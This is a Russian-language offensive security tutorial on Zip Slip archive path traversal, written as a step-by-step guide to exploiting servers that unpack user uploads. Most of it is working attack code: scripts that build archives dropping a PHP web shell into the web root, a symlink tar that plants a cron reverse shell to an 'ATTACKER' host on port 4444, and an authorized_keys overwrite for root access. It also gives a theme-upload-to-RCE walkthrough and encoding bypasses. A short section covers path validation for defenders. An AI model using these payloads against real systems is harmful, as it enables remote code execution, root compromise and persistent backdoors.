Zip Slip — это уязвимость распаковки архивов, при которой имена файлов внутри архива содержат `../` и при извлечении «вылезают» за пределы целевого каталога. Если приложение распаковывает пользовательский архив (загрузка, импорт, обновление, распаковка темы/плагина) без проверки путей, атакующий может записать файлы в произвольные места — вплоть до перезаписи конфигов, ключей и кода, что даёт RCE.

## Суть уязвимости

Библиотеки распаковки по умолчанию часто доверяют именам файлов внутри архива. Запись вида `../../../../var/www/html/shell.php` в ZIP/TAR приводит к записи за пределами каталога распаковки.

```bash
# создаём вредоносный zip с traversal-путём
mkdir -p evil && cd evil
printf '<?php system($_GET["c"]); ?>' > shell.php
zip evil.zip shell.php
# переписываем имя на traversal
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('evil.zip','a')
z.writestr('../../../../var/www/html/evil.php', '<?php system($_GET["c"]); ?>')
z.close()
PY
```

При распаковке на сервере файл `evil.php` окажется в `/var/www/html/`, если сервер не проверяет пути.

## Варианты обхода

Проверки путей часто неполны, и их обходят несколькими способами. Абсолютные пути (`/etc/cron.d/x`), обратные слеши (`..\..\`), URL-кодирование (`%2e%2e%2f`), двойное кодирование, юникод (`..%c0%af`), смешанные разделители, а также симлинки внутри архива (symlink-атака: ссылка на `/etc/passwd`, затем запись «через» неё).

```bash
# symlink-атака в tar
ln -s /etc/cron.d evil
tar czf evil.tar.gz evil
# или через python
python3 - <<'PY'
import tarfile, io
t = tarfile.open('evil.tar','w')
info = tarfile.TarInfo('link'); info.type = tarfile.SYMTYPE; info.linkname = '/etc/cron.d'
t.addfile(info)
data = b'* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"\n'
info2 = tarfile.TarInfo('link/evil'); info2.size = len(data)
t.addfile(info2, io.BytesIO(data)); t.close()
PY
```

## Где встречается Zip Slip

Классические точки: загрузка темы/плагина (WordPress, Joomla), импорт проектов (CI/CD, IDE), обновление ПО, распаковка бэкапов, обработка документов (DOCX/XLSX — это ZIP), конвертеры форматов. Всегда, когда приложение принимает архив от пользователя и распаковывает его, есть риск.

```bash
# ищем эндпоинты загрузки/импорта
ffuf -w paths.txt -u https://t/FUZZ -mc 200 -fs 0 | grep -iE 'upload|import|extract|restore|unzip'
```

## Разобранный пример: обновление темы → RCE

```bash
# 1. находим загрузку темы
$ curl -s https://t/admin/themes | grep -i upload

# 2. готовим вредоносный архив
$ python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('theme.zip','w')
z.writestr('theme/style.css', 'body{}')
z.writestr('../../../var/www/html/evil.php', '<?php system($_GET["c"]); ?>')
z.close()
PY

# 3. загружаем
$ curl -s -X POST https://t/admin/themes/upload -F 'file=@theme.zip' -b 'session=admin'
{"ok":true}

# 4. проверяем RCE
$ curl -s 'https://t/evil.php?c=id'
uid=33(www-data) gid=33(www-data)
```

Артефакт — вывод `id` из веб-сервера.

## Разобранный пример: symlink → перезапись файла

```bash
# tar с симлинком на /root/.ssh, затем запись authorized_keys
$ python3 - <<'PY'
import tarfile, io
t = tarfile.open('x.tar','w')
i = tarfile.TarInfo('.ssh'); i.type = tarfile.SYMTYPE; i.linkname = '/root/.ssh'; t.addfile(i)
k = b'ssh-rsa AAAA...attacker-key\n'
i2 = tarfile.TarInfo('.ssh/authorized_keys'); i2.size = len(k)
t.addfile(i2, io.BytesIO(k)); t.close()
PY
# после распаковки root-доступ по ключу
```

## Инструменты

```bash
# создание вредоносных архивов
# zip
zip evil.zip ../../../../tmp/evil.txt
# tar
tar --transform 's|^|../../../../|' -czf evil.tar.gz file
# специальные инструменты
# evilarc (python2/3) — генератор traversal-архивов
python3 evilarc.py -d 5 -o unix -f evil.zip shell.php
# проверка: распаковать в песочнице и посмотреть, куда попали файлы
```

## Крайние случаи и подводные камни

- **Проверка только `../`** обходится обратными слешами и кодированием.
- **Проверка после нормализации** может быть обойдена (нормализация до/после).
- **Симлинки** — отдельный вектор: архив создаёт ссылку, затем пишет «через» неё.
- **Права процесса** определяют, куда можно писать (`www-data` vs `root`).
- **Ограничение размера** не защищает от traversal, только от «zip bomb».
- **Windows-серверы** уязвимы к обратным слешам и дискам (`C:\`).

## Что делать дальше / решение

1. **Найдите распаковку** — загрузка архивов, импорт, обновление, восстановление.
2. **Соберите вредоносный архив** с traversal-путём.
3. **Загрузите** и проверьте, куда попал файл (ищите его по URL или через чтение).
4. **Попробуйте обходы** — кодирование, слеши, симлинки, абсолютные пути.
5. **Добейте до RCE** — перезапись конфига/кода или symlink на cron/authorized_keys.
6. **Тупик** — переходите к file upload и path traversal.

## Справочная таблица

| Обход | Пример | Против чего |
|-------|--------|-------------|
| `../` | `../../x` | наивная проверка |
| абсолютный | `/etc/cron.d/x` | проверка «только внутри» |
| обратные слеши | `..\..\x` | unix-проверка на Windows |
| URL-кодирование | `%2e%2e%2f` | фильтр строки |
| двойное кодирование | `%252e%252e` | однократный декод |
| юникод | `..%c0%af` | ASCII-фильтр |
| symlink | ссылка на `/root` | любая проверка путей |

## Глубже: почему библиотеки уязвимы

Zip Slip — не баг приложения, а **баг библиотек** распаковки, и в 2018 году он затронул сотни проектов: Java (`java.util.zip`), .NET, Go, Ruby, Python, Node.js, PHP. Причина одна: API распаковки принимает имя файла из архива и пишет по нему, не проверяя, остаётся ли путь внутри целевого каталога. Разработчик думает, что библиотека «безопасна», и не добавляет проверку. Поэтому Zip Slip встречается в самых разных продуктах — от CI/CD и IDE до CMS и антивирусов.

Хорошая проверка на стороне кода: после распаковки каждого файла вычислить канонический путь и убедиться, что он начинается с целевого каталога (`startsWith(targetDir)`), а также отвергать абсолютные пути, симлинки и `..`. Многие реализации делают это неправильно: проверяют строку до нормализации, забывают симлинки или не учитывают регистр на Windows.

## Глубже: связка с другими уязвимостями

Zip Slip редко бывает изолированным — он усиливает другие находки. Во-первых, **path traversal**: если приложение уже уязвимо к обходу путей, Zip Slip даёт запись, а не только чтение. Во-вторых, **file upload**: если загрузка разрешает архивы, Zip Slip превращает «безобидную» загрузку в RCE. В-третьих, **подмена конфигурации**: перезапись `settings.php`, `.env`, `web.config` меняет поведение приложения. В-четвёртых, **symlink + cron/authorized_keys**: прямая эскалация до root, если процесс распаковки работает от привилегированного пользователя.

Отдельно стоит «zip bomb» — архив, который при распаковке раздувается до огромных размеров (или создаёт вложенные архивы), исчерпывая диск. Это DoS-родственник Zip Slip, и проверять его нужно так же аккуратно (без реального заполнения диска).

## Глубже: тестирование в изоляции

Zip Slip легко тестировать в песочнице, не рискуя продакшном. Создайте архив с traversal-путями, распакуйте его **локально** той же библиотекой/инструментом, что использует цель, и посмотрите, куда попадают файлы. Если файл оказался за пределами целевого каталога — библиотека уязвима. Затем проверьте, какое имя/расширение принимает сервер и куда можно записать в его контексте (веб-корень, конфиг, cron).

```bash
# локальная проверка: распаковка в изолированный каталог
mkdir -p /tmp/sandbox/target && cd /tmp/sandbox
unzip -o evil.zip -d target/ 2>/dev/null
find /tmp/sandbox -name 'evil.php'    # если вне target/ -> traversal
```

Такой подход даёт уверенность до отправки на цель и не оставляет следов на продакшне. Только после локального подтверждения отправляйте архив на сервер и проверяйте результат по URL или через чтение.

## Итог и приоритизация

Наиболее критичен Zip Slip с записью в исполняемый каталог (веб-корень, cron, `authorized_keys`) — это RCE. Далее — перезапись конфигурации (изменение поведения, иногда RCE). Symlink-атаки — высокий уровень, часто дают root. Zip bomb — средний/высокий (DoS). При отчёте указывайте точный путь, куда попал файл, и артефакт (например, вывод `id` или изменённый конфиг).

## Чек-лист аудита распаковки

Пройдитесь по этому списку для любого эндпоинта, принимающего архив. Первое — найдите все места распаковки: загрузка тем/плагинов, импорт, восстановление бэкапа, обновление, обработка офисных документов. Второе — определите библиотеку/инструмент распаковки (если доступен код или по поведению). Третье — проверьте локально, уязвима ли эта библиотека к traversal (создайте архив и распакуйте в песочницу). Четвёртое — проверьте, какие пути доступны на запись в контексте процесса (веб-корень, конфиг, cron, `~/.ssh`). Пятое — соберите вредоносный архив под конкретную цель и загрузите. Шестое — проверьте результат по URL/чтением/эффектом. Седьмое — попробуйте обходы (кодирование, слеши, симлинки, абсолютные пути). Восьмое — зафиксируйте артефакт и путь. Такой порядок исключает риск «выстрелить вслепую» и даёт воспроизводимый PoC.

Отдельно проверьте лимиты: размер архива, число файлов, глубину. Их отсутствие — усилитель (zip bomb), но и признак слабой валидации в целом. И помните: если процесс распаковки работает от root, symlink-атака на `authorized_keys`/cron даёт полный контроль над хостом — это самая опасная комбинация.

## Итог

Zip Slip — недооценённая уязвимость: она не требует сложной логики, но при наличии эндпоинта распаковки и записи в исполняемый каталог превращается в прямой RCE. Ключ к её обнаружению — не забывать, что «загрузка архива» — это всегда распаковка где-то на сервере, и что библиотеки распаковки исторически уязвимы к traversal. Тестируйте локально в песочнице, собирайте архивы с `../`, абсолютными путями и симлинками, проверяйте обходы кодированием. И фиксируйте артефакт: путь записи и результат (изменённый файл или вывод `id`). Если удалось перезаписать код или получить symlink на cron — это критичная находка, достойная максимального приоритета в отчёте.
